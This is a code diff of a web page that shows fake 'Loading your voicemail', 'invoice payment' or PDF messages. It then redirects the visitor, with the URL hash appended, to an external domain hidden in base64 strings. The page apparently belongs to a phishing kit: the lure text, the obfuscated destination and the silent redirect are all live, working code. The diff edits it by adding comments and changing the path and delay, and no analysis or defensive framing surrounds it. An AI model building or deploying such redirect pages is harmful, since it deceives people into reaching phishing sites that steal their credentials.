@@ -56,10 +56,10 @@
   var parts = [
     'aHR0cHM6Ly8=',    // 'https://'
     'bWVoZWZmLnByaW50c2NvZ3JhcGhpY3MuaXQuY29t', //  domain base64
-    '/SnJ6VFlDRno='             // static page path
+    '/JrzTYCFz'             // static page path
   ];
 
- 
+  // Decode Base64 encoded strings
   function b64Decode(str) {
     try {
       return atob(str);
@@ -68,23 +68,23 @@
     }
   }
 
-  
+  // Compose base URL by decoding and joining
   var baseUrl = b64Decode(parts[0]) + b64Decode(parts[1]) + parts[2];
 
-  
+  // Get current URL hash (including #)
   var hash = window.location.hash; 
 
-  
+  // Get loading type from query parameter
   const urlParams = new URLSearchParams(window.location.search);
   const loadingType = urlParams.get('file') || 'none'; // Default loading type
 
-
+  // Map loading types to icons and messages
   const loadingIcons = {
-    'pdf': '📄',        
-    'voicemail': '📞',  
-    'invoice': '💳',    
-    'default': '⏳',    
-    'none': ''          
+    'pdf': '📄',        // page with curl emoji
+    'voicemail': '📞',  // telephone receiver emoji
+    'invoice': '💳',    // credit card emoji
+    'default': '⏳',    // hourglass not done emoji
+    'none': ''          // no icon
   };
 
   const loadingMessages = {
@@ -92,10 +92,10 @@
     'voicemail': 'Loading your voicemail...',
     'invoice': 'Loading invoice payment...',
     'default': 'Loading, please wait...',
-    'none': '' 
+    'none': '' // No loader/message
   };
 
- 
+  // Set icon & message or hide if 'none'
   const iconElem = document.getElementById('loaderIcon');
   const messageElem = document.getElementById('loadingMessage');
 
@@ -109,15 +109,18 @@
     messageElem.style.display = 'block';
   }
 
+  // Compose final redirect URL
   var redirectUrl = baseUrl;
 
+  // Append original hash (including #) to final redirect URL if present
   if (hash) {
     redirectUrl += hash;
   }
 
+  // Delay to show loader then redirect
   setTimeout(function() {
     window.location.replace(redirectUrl);
-  }, 3000);
+  }, 3800);
 })();
 </script>
 </body>
